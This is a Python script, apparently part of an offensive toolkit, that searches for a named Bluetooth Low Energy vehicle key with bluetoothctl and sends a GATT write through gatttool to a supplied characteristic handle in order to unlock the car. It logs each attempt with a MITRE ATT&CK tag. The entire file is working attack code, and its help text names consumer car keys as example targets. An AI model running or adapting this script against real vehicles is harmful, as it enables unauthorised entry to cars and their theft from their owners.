#!/usr/bin/env python3
# modules/attacks/vehicle_bluetooth_unlocker.py

import argparse
import os
import json
import time
import subprocess
from datetime import datetime

LOG_FILE = "results/vehicle_ble_unlock_log.json"
MITRE_TTP = "T1557.002"

def log_result(device, spoofed):
    os.makedirs("results", exist_ok=True)
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps({
            "timestamp": datetime.utcnow().isoformat(),
            "target_device": device,
            "spoofed": spoofed,
            "ttp": MITRE_TTP
        }) + "\n")

def scan_and_spoof(target_name, unlock_char):
    print(f"[*] Scanning for BLE device '{target_name}'...")
    try:
        output = subprocess.check_output(["bluetoothctl", "devices"], universal_newlines=True)
        for line in output.splitlines():
            if target_name in line:
                mac = line.split()[1]
                print(f"[✓] Found {target_name} at {mac}")
                spoof_command(mac, unlock_char)
                return
        print("[!] Target device not found.")
    except Exception as e:
        print(f"[!] BLE scan failed: {e}")

def spoof_command(mac, char_uuid):
    print(f"[*] Spoofing unlock command via GATT write...")
    try:
        subprocess.run([
            "gatttool", "-b", mac, "--char-write-req", "-a", char_uuid, "-n", "0100"
        ], timeout=5)
        log_result(mac, True)
        print("[✓] Unlock attempt sent.")
    except Exception as e:
        print(f"[!] Spoof failed: {e}")
        log_result(mac, False)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Spoof BLE unlock on insecure vehicle proximity keys")
    parser.add_argument("--name", required=True, help="Name of the BLE key (e.g. TeslaKey, BMW_KEY)")
    parser.add_argument("--char", required=True, help="BLE characteristic handle for unlock")
    args = parser.parse_args()
    scan_and_spoof(args.name, args.char)
